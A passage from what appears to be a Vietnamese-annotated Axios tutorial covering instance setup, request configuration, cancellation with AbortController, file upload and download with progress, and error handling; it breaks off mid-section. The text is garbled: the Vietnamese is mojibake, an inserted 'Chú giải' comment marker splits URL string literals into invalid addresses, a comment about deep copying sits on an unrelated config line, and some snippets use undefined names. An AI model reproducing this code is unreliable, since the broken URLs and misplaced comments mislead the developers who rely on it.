 * ‚îÇ Error Handling     ‚îÇ ‚ùå Manual check  ‚îÇ ‚úÖ Auto throw    ‚îÇ
 * ‚îÇ Timeout            ‚îÇ ‚ùå AbortControl  ‚îÇ ‚úÖ Built-in      ‚îÇ
 * ‚îÇ Interceptors       ‚îÇ ‚ùå None          ‚îÇ ‚úÖ Built-in      ‚îÇ
 * ‚îÇ Progress Events    ‚îÇ ‚ùå Complex       ‚îÇ ‚úÖ Easy          ‚îÇ
 * ‚îÇ Cancel Requests    ‚îÇ ‚ö†Ô∏è AbortControl  ‚îÇ ‚úÖ Multiple ways ‚îÇ
 * ‚îÇ Browser Support    ‚îÇ ‚úÖ Native        ‚îÇ ‚ö†Ô∏è +13KB bundle  ‚îÇ
 * ‚îÇ CSRF Protection    ‚îÇ ‚ùå Manual        ‚îÇ ‚úÖ Built-in      ‚îÇ
 * ‚îÇ Base URL           ‚îÇ ‚ùå Manual        ‚îÇ ‚úÖ Config        ‚îÇ
 * ‚îÇ Request/Response   ‚îÇ ‚ùå None          ‚îÇ ‚úÖ Transform     ‚îÇ
 * ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
 */
```



### **2. Axios Instance & Configuration**

#### **2.1. Create Custom Instance**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: CREATE AXIOS INSTANCE - Best Practice
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

import axios, { AxiosInstance } from 'axios';

 // Ch√∫ gi·∫£i: T·∫°o instance v·ªõi base config
const apiClient: AxiosInstance = axios.create({
  baseURL: process.env.REACT_APP_API_URL || 'https: // Ch√∫ gi·∫£i: api.example.com',
  timeout: 10000, // Ch√∫ gi·∫£i: 10 seconds
  headers: {
    'Content-Type': 'application/json',
    'Accept': 'application/json',
  },
  
 // Ch√∫ gi·∫£i: Credentials & CSRF
  withCredentials: true, // Ch√∫ gi·∫£i: Send cookies v·ªõi cross-origin requests
  xsrfCookieName: 'XSRF-TOKEN', // Ch√∫ gi·∫£i: CSRF token cookie name
  xsrfHeaderName: 'X-XSRF-TOKEN', // Ch√∫ gi·∫£i: CSRF token header name
  
 // Ch√∫ gi·∫£i: Validate status
  validateStatus: (status) => status >= 200 && status < 500,
});

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: MULTIPLE INSTANCES - Cho different APIs
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

 // Ch√∫ gi·∫£i: Main API
const mainAPI = axios.create({
  baseURL: 'https: // Ch√∫ gi·∫£i: api.main.com',
  timeout: 5000,
});

// Auth API (separate instance ƒë·ªÉ tr√°nh infinite loop trong token refresh)
const authAPI = axios.create({
  baseURL: 'https: // Ch√∫ gi·∫£i: auth.main.com',
  timeout: 3000,
});

 // Ch√∫ gi·∫£i: Analytics API
const analyticsAPI = axios.create({
  baseURL: 'https: // Ch√∫ gi·∫£i: analytics.main.com',
  timeout: 15000,
});

 // Ch√∫ gi·∫£i: File Upload API
const uploadAPI = axios.create({
  baseURL: 'https: // Ch√∫ gi·∫£i: upload.main.com',
  timeout: 60000, // Ch√∫ gi·∫£i: 1 minute for large files
  headers: {
    'Content-Type': 'multipart/form-data',
  },
});

 // Ch√∫ gi·∫£i: S·ª≠ d·ª•ng
mainAPI.get('/users');
authAPI.post('/login', credentials);
analyticsAPI.post('/track', event);
uploadAPI.post('/files', formData);
```

#### **2.2. Full Request Configuration**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: COMPLETE CONFIG OPTIONS
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

const config = {
 // Ch√∫ gi·∫£i: URL
  url: '/users',
  baseURL: 'https: // Ch√∫ gi·∫£i: api.example.com',
  
 // Ch√∫ gi·∫£i: Method
  method: 'get', // Ch√∫ gi·∫£i: 'get' | 'post' | 'put' | 'delete' | 'patch' | 'head' | 'options'
  
 // Ch√∫ gi·∫£i: Headers
  headers: {
    'Authorization': 'Bearer token',
    'X-Custom-Header': 'value',
  },
  
 // Ch√∫ gi·∫£i: Query params (?key=value)
  params: {
    page: 1,
    limit: 10,
    sort: 'createdAt:desc',
  },
  
 // Ch√∫ gi·∫£i: Params serializer
  paramsSerializer: {
    serialize: (params) => {
 // Ch√∫ gi·∫£i: Custom serialization
      return Object.entries(params)
        .map(([key, val]) => `${key}=${encodeURIComponent(val)}`)
        .join('&');
    },
  },
  
 // Ch√∫ gi·∫£i: Request body
  data: {
    name: 'John',
    age: 30,
  },
  
 // Ch√∫ gi·∫£i: Timeout
  timeout: 5000, // Ch√∫ gi·∫£i: 5 seconds
  
 // Ch√∫ gi·∫£i: Response type
  responseType: 'json', // D√πng `JSON.parse(JSON.stringify(obj))` l√† hack sao ch√©p s√¢u nh∆∞ng s·∫Ω m·∫•t h√†m, `Date`, `undefined`, symbol, v.v.
  
 // Ch√∫ gi·∫£i: Response encoding
  responseEncoding: 'utf8',
  
 // Ch√∫ gi·∫£i: Max content length
  maxContentLength: 2000,
  maxBodyLength: 2000,
  
 // Ch√∫ gi·∫£i: Validate status
  validateStatus: (status) => status >= 200 && status < 300,
  
 // Ch√∫ gi·∫£i: Max redirects
  maxRedirects: 5,
  
 // Ch√∫ gi·∫£i: HTTP Auth
  auth: {
    username: 'user',
    password: 'pass',
  },
  
 // Ch√∫ gi·∫£i: Proxy
  proxy: {
    protocol: 'http',
    host: '127.0.0.1',
    port: 9000,
    auth: {
      username: 'proxy-user',
      password: 'proxy-pass',
    },
  },
  
 // Ch√∫ gi·∫£i: Progress events
  onUploadProgress: (progressEvent) => {
    const percentCompleted = Math.round(
      (progressEvent.loaded * 100) / progressEvent.total!
    );
    console.log(`Upload: ${percentCompleted}%`);
  },
  
  onDownloadProgress: (progressEvent) => {
    const percentCompleted = Math.round(
      (progressEvent.loaded * 100) / progressEvent.total!
    );
    console.log(`Download: ${percentCompleted}%`);
  },
  
 // Ch√∫ gi·∫£i: Decompress response
  decompress: true,
};

const response = await axios(config);
```

---

### **3. Request Cancellation - H·ªßy Request**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: ABORT CONTROLLER (Modern - Axios 0.22+)
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

const controller = new AbortController();

axios.get('/api/users', {
  signal: controller.signal
}).then(response => {
  console.log(response.data);
}).catch(error => {
  if (axios.isCancel(error)) {
    console.log('Request canceled:', error.message);
  }
});

 // Ch√∫ gi·∫£i: Cancel request
controller.abort('User canceled the request');

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: USE CASE 1: Cancel on Component Unmount (React)
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

import { useEffect, useState } from 'react';

function UserList() {
  const [users, setUsers] = useState([]);
  
  useEffect(() => {
    const controller = new AbortController();
    
    const fetchUsers = async () => {
      try {
        const { data } = await axios.get('/api/users', {
          signal: controller.signal
        });
        setUsers(data);
      } catch (error) {
        if (!axios.isCancel(error)) {
          console.error('Error fetching users:', error);
        }
      }
    };
    
    fetchUsers();
    
 // Ch√∫ gi·∫£i: Cleanup: Cancel request khi unmount
    return () => {
      controller.abort();
    };
  }, []);
  
  return <div>...</div>;
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: USE CASE 2: Cancel Previous Search Request
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function SearchComponent() {
  const [query, setQuery] = useState('');
  const controllerRef = useRef<AbortController | null>(null);
  
  const handleSearch = async (searchQuery: string) => {
    // Cancel previous request n·∫øu c√≥
    if (controllerRef.current) {
      controllerRef.current.abort();
    }
    
 // Ch√∫ gi·∫£i: Create new controller
    controllerRef.current = new AbortController();
    
    try {
      const { data } = await axios.get('/api/search', {
        params: { q: searchQuery },
        signal: controllerRef.current.signal
      });
      setResults(data);
    } catch (error) {
      if (!axios.isCancel(error)) {
        console.error('Search error:', error);
      }
    }
  };
  
 // Ch√∫ gi·∫£i: Debounce search
  useEffect(() => {
    const timer = setTimeout(() => {
      if (query) {
        handleSearch(query);
      }
    }, 500);
    
    return () => clearTimeout(timer);
  }, [query]);
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
// CANCEL TOKEN (Legacy - Deprecated nh∆∞ng v·∫´n ho·∫°t ƒë·ªông)
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

const CancelToken = axios.CancelToken;
const source = CancelToken.source();

axios.get('/api/users', {
  cancelToken: source.token
}).catch(error => {
  if (axios.isCancel(error)) {
    console.log('Request canceled:', error.message);
  }
});

 // Ch√∫ gi·∫£i: Cancel
source.cancel('Operation canceled by user');
```

---

### **4. File Upload & Download**

#### **4.1. File Upload with Progress**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: UPLOAD SINGLE FILE
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

const uploadFile = async (file: File) => {
  const formData = new FormData();
  formData.append('file', file);
  formData.append('userId', '123');
  
  try {
    const { data } = await axios.post('/api/upload', formData, {
      headers: {
        'Content-Type': 'multipart/form-data',
      },
      onUploadProgress: (progressEvent) => {
        const percentCompleted = Math.round(
          (progressEvent.loaded * 100) / progressEvent.total!
        );
        console.log(`Upload progress: ${percentCompleted}%`);
 // Ch√∫ gi·∫£i: Update UI progress bar
      },
    });
    
    return data;
  } catch (error) {
    console.error('Upload failed:', error);
    throw error;
  }
};

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: UPLOAD MULTIPLE FILES
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

const uploadMultipleFiles = async (files: File[]) => {
  const formData = new FormData();
  
  files.forEach((file, index) => {
    formData.append(`file${index}`, file);
  });
  
  const { data } = await axios.post('/api/upload-multiple', formData, {
    headers: {
      'Content-Type': 'multipart/form-data',
    },
    onUploadProgress: (progressEvent) => {
      const percentCompleted = Math.round(
        (progressEvent.loaded * 100) / progressEvent.total!
      );
      console.log(`Total upload progress: ${percentCompleted}%`);
    },
  });
  
  return data;
};

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: REACT COMPONENT - File Upload v·ªõi Progress Bar
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function FileUploader() {
  const [uploadProgress, setUploadProgress] = useState(0);
  const [uploading, setUploading] = useState(false);
  
  const handleFileUpload = async (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (!file) return;
    
    const formData = new FormData();
    formData.append('file', file);
    
    setUploading(true);
    
    try {
      await axios.post('/api/upload', formData, {
        onUploadProgress: (progressEvent) => {
          const progress = Math.round(
            (progressEvent.loaded * 100) / progressEvent.total!
          );
          setUploadProgress(progress);
        },
      });
      
      alert('Upload successful!');
    } catch (error) {
      console.error('Upload failed:', error);
    } finally {
      setUploading(false);
      setUploadProgress(0);
    }
  };
  
  return (
    <div>
      <input type="file" onChange={handleFileUpload} disabled={uploading} />
      {uploading && (
        <div className="progress-bar">
          <div style={{ width: `${uploadProgress}%` }}>
            {uploadProgress}%
          </div>
        </div>
      )}
    </div>
  );
}
```

#### **4.2. File Download**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: DOWNLOAD FILE
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

const downloadFile = async (fileId: string) => {
  try {
    const response = await axios.get(`/api/files/${fileId}`, {
      responseType: 'blob', // Ch√∫ gi·∫£i: ‚úÖ Important cho files
      onDownloadProgress: (progressEvent) => {
        const percentCompleted = Math.round(
          (progressEvent.loaded * 100) / progressEvent.total!
        );
        console.log(`Download progress: ${percentCompleted}%`);
      },
    });
    
    // Create blob URL v√† trigger download
    const url = window.URL.createObjectURL(new Blob([response.data]));
    const link = document.createElement('a');
    link.href = url;
    link.setAttribute('download', 'filename.pdf'); // Ch√∫ gi·∫£i: Filename
    document.body.appendChild(link);
    link.click();
    link.remove();
    window.URL.revokeObjectURL(url);
  } catch (error) {
    console.error('Download failed:', error);
  }
};

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: DOWNLOAD DIFFERENT FILE TYPES
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

const downloadPDF = async () => {
  const response = await axios.get('/api/report.pdf', {
    responseType: 'blob',
  });
  
  const blob = new Blob([response.data], { type: 'application/pdf' });
  const url = window.URL.createObjectURL(blob);
  window.open(url); // Ch√∫ gi·∫£i: Open in new tab
};

const downloadExcel = async () => {
  const response = await axios.get('/api/export.xlsx', {
    responseType: 'arraybuffer', // Ch√∫ gi·∫£i: For Excel files
  });
  
  const blob = new Blob([response.data], {
    type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  });
  
  const url = window.URL.createObjectURL(blob);
  const link = document.createElement('a');
  link.href = url;
  link.download = 'export.xlsx';
  link.click();
};
```

---

### **5. Error Handling - X·ª≠ L√Ω L·ªói Chi Ti·∫øt**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: ERROR STRUCTURE
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

try {
  const response = await axios.get('/api/users');
} catch (error) {
  if (axios.isAxiosError(error)) {
 // Ch√∫ gi·∫£i: ‚úÖ Type-safe error handling
    
    if (error.response) {
      // ‚ùå Server responded v·ªõi status code ngo√†i 2xx
      console.error('Response error:');
      console.error('Status:', error.response.status);
      console.error('Data:', error.response.data);
      console.error('Headers:', error.response.headers);
      
 // Ch√∫ gi·∫£i: Handle specific status codes
      switch (error.response.status) {
        case 400:
          console.error('Bad Request - Invalid data');
          break;
        case 401:
          console.error('Unauthorized - Please login');
 // Ch√∫ gi·∫£i: Redirect to login
          window.location.href = '/login';
          break;
        case 403:
          console.error('Forbidden - No permission');
          break;
        case 404:
          console.error('Not Found');
          break;
        case 422:
          console.error('Validation Error');
 // Ch√∫ gi·∫£i: Show validation errors
          const validationErrors = error.response.data.errors;
          break;
        case 429:
          console.error('Too Many Requests - Rate limited');
          break;
        case 500:
          console.error('Server Error');
          break;
        case 503:
          console.error('Service Unavailable');
          break;
      }
      
    } else if (error.request) {
      // ‚ùå Request sent nh∆∞ng kh√¥ng nh·∫≠n ƒë∆∞·ª£c response
      console.error('Request error - No response received');
      console.error('Possible causes:');
